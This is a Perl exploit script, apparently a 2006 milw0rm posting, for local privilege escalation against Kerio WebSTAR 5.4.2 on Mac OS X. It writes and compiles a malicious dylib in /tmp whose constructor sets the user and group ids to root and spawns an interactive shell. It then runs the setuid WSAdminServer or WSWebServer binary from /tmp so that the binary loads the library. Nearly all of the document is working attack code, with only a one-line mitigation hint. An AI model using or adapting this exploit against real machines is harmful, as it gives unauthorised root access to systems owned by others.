#!/usr/bin/perl
#
# http://www.digitalmunition.com
# written by kf (kf_lists[at]digitalmunition[dot]com)
#
# you must have access to the webstar user or be in the admin group
#
# This is currently not patched... chmod -s your kerio binaries

foreach $key (keys %ENV) {

   delete $ENV{$key};

}

$tgts{"0"} = "kerio-webstar-5.4.2-mac.bin - WSAdminServer:/Applications/Kerio WebSTAR/AdminServer/WSAdminServer";
$tgts{"1"} = "kerio-webstar-5.4.2-mac.bin - WSWebServer:/Applications/Kerio WebSTAR/WebServer/WSWebServer";

unless (($target) = @ARGV) {

       print "\n\nUsage: $0 <target> \n\nTargets:\n\n";

       foreach $key (sort(keys %tgts)) {
               ($a,$b) = split(/\:/,$tgts{"$key"});
               print "\t$key . $a\n";
       }

       print "\n";
       exit 1;
}

$ret = pack("l", ($retval));
($a,$b) = split(/\:/,$tgts{"$target"});
print "*** Target: $a, Binary: $b\n";

open(KP,">/tmp/kerio_pwn.c");
printf KP "extern char * argv; __attribute__((constructor)) static void kerio_pwned()\n";
printf KP "{ seteuid(0); setegid(0); setuid(0); setgid(0); system(\"/bin/sh -i\"); exit(0); }\n";

system("gcc -dynamiclib -o /tmp/libucache.dylib /tmp/kerio_pwn.c -current_version 5.0.1 -compatibility_version 5.0.1 -install_name libucache.5.dylib -arch ppc");

system("cd /tmp; \"$b\"");

# milw0rm.com [2006-11-15]